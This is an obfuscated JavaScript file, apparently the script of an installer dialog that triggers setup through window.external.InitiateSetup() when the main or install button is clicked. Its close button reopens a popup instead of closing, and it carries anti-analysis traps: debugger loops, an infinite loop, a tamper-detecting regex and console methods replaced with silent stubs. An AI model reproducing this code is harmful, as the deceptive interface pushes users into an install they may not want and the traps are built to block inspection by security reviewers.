;(function () {
  var S = (function () {
      var B = true
      return function (Y, t) {
        var L = B
          ? function () {
              if (t) {
                var n = t.apply(Y, arguments)
                return (t = null), n
              }
            }
          : function () {}
        return (B = false), L
      }
    })(),
    C = (function () {
      var t = true
      return function (L, n) {
        var F = t
          ? function () {
              if (n) {
                var P = n.apply(L, arguments)
                return (n = null), P
              }
            }
          : function () {}
        return (t = false), F
      }
    })(),
    r = (function () {
      var B = true
      return function (Y, t) {
        var L = B
          ? function () {
              if (t) {
                var n = t.apply(Y, arguments)
                return (t = null), n
              }
            }
          : function () {}
        return (B = false), L
      }
    })()
  try {
    var N = document.querySelector('div#popup'),
      E = document.querySelector('button.button'),
      K = document.querySelector('button#install'),
      U = document.querySelector('button#cancel'),
      M = document.querySelector('span#x-no-cancel'),
      D = document.querySelector('div.close-button'),
      i = document.querySelector('div#all'),
      p = document.querySelector('div#loadingDiv'),
      I = null
    try {
      I = window.external
    } catch (B) {}
    var R = function () {
      try {
        p.style.display = 'flex'
        i.style.display = 'none'
        N.style.display = 'none'
        I.InitiateSetup()
        p.style.display = 'none'
        I.CeaseApplication(0)
      } catch (Y) {}
    }
    ;(function () {
      var t = S(this, function () {
        return t
          .toString()
          .search('(((.+)+)+)+$')
          .toString()
          .constructor(t)
          .search('(((.+)+)+)+$')
      })
      t()
      ;(function () {
        C(this, function () {
          var x = new RegExp('function *\\( *\\)'),
            V = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
            O = o('init')
          !x.test(O + 'chain') || !V.test(O + 'input') ? O('0') : o()
        })()
      })()
      var L = r(this, function () {
        var n
        try {
          var F = Function(
            'return (function() {}.constructor("return this")( ));'
          )
          n = F()
        } catch (z) {
          n = window
        }
        var P = (n.console = n.console || {}),
          x = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
        for (var V = 0; V < x.length; V++) {
          var O = r.constructor.prototype.bind(r),
            J = x[V],
            u = P[J] || O
          O['__proto__'] = r.bind(r)
          O.toString = u.toString.bind(u)
          P[J] = O
        }
      })
      L()
      try {
        E.addEventListener('click', function () {
          R()
        })
        K.addEventListener('click', function () {
          R()
        })
        D.addEventListener('click', function () {
          i.style.display = 'none'
          N.style.display = 'block'
        })
        M.addEventListener('click', function () {
          N.style.display = 'none'
          i.style.display = 'block'
        })
        U.addEventListener('click', function () {
          I.CeaseApplication(0)
        })
        return
      } catch (n) {}
      I.CeaseApplication(0)
    })()
  } catch (Y) {}
})()
function o(h) {
  function G(w) {
    if (typeof w === 'string') {
      return function (j) {}.constructor('while (true) {}').apply('counter')
    } else {
      if (('' + w / w).length !== 1 || w % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    G(++w)
  }
  try {
    if (h) {
      return G
    } else {
      G(0)
    }
  } catch (w) {}
}
